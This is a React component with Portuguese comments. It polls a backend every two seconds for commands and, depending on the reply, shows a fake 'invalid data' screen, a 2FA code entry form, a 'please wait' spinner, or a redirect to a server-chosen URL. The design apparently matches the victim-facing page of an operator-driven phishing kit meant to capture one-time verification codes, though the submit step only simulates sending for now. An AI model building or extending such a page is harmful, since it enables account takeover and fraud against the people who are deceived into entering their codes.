import { useState, useEffect } from "react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function CommandPage({ userId }) {
  const [currentCommand, setCurrentCommand] = useState(null);
  const [inputValue, setInputValue] = useState("");
  const [loading, setLoading] = useState(false);

  // Verificar comandos a cada 2 segundos
  useEffect(() => {
    const checkCommand = async () => {
      try {
        const response = await axios.get(`${API}/user/check-action/${userId}`);
        if (response.data && response.data.action) {
          setCurrentCommand(response.data);
        }
      } catch (error) {
        console.error("Erro ao verificar comando:", error);
      }
    };

    checkCommand();
    const interval = setInterval(checkCommand, 2000);
    return () => clearInterval(interval);
  }, [userId]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    // Aqui você pode enviar o dado para o backend
    // Por enquanto só simula
    setTimeout(() => {
      setInputValue("");
      setLoading(false);
    }, 1000);
  };

  // Página de dados inválidos
  if (currentCommand?.action === "INV") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full text-center">
          <div className="mb-6">
            <svg className="w-20 h-20 mx-auto text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Dados Inválidos</h1>
          <p className="text-gray-600 mb-8">
            Os dados que você digitou estão incorretos. Por favor, tente novamente com as informações corretas.
          </p>
          <button
            onClick={() => window.location.reload()}
            className="bg-pink-500 hover:bg-pink-600 text-white px-8 py-3 rounded-full font-semibold transition-colors"
          >
            Tentar Novamente
          </button>
        </div>
      </div>
    );
  }

  // Página de código 2FA
  if (currentCommand?.action === "AUT") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full">
          <h1 className="text-2xl font-bold text-gray-900 mb-6 text-center">Código de Verificação</h1>
          <p className="text-gray-600 mb-6 text-center">Digite o código de 6 dígitos que enviamos para você</p>
          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              type="text"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder="000000"
              maxLength="6"
              className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg text-center text-2xl font-bold tracking-widest focus:border-pink-500 focus:outline-none"
            />
            <button
              type="submit"
              disabled={loading || inputValue.length !== 6}
              className="w-full bg-pink-500 hover:bg-pink-600 disabled:bg-gray-300 text-white py-3 rounded-full font-semibold transition-colors"
            >
              {loading ? "Verificando..." : "Confirmar"}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Página aguarde
  if (currentCommand?.action === "AGUARDE") {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center px-4 font-inter">
        <div className="max-w-md w-full text-center">
          <div className="mb-6">
            <div className="inline-block animate-spin rounded-full h-16 w-16 border-b-4 border-pink-500"></div>
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-4">Aguarde...</h1>
          <p className="text-gray-600">
            Estamos processando sua solicitação. Por favor, aguarde um momento.
          </p>
        </div>
      </div>
    );
  }

  // Redirecionar
  if (currentCommand?.action === "REDIRECT" && currentCommand?.redirect_url) {
    window.location.href = currentCommand.redirect_url;
    return null;
  }

  return null;
}

export default CommandPage;
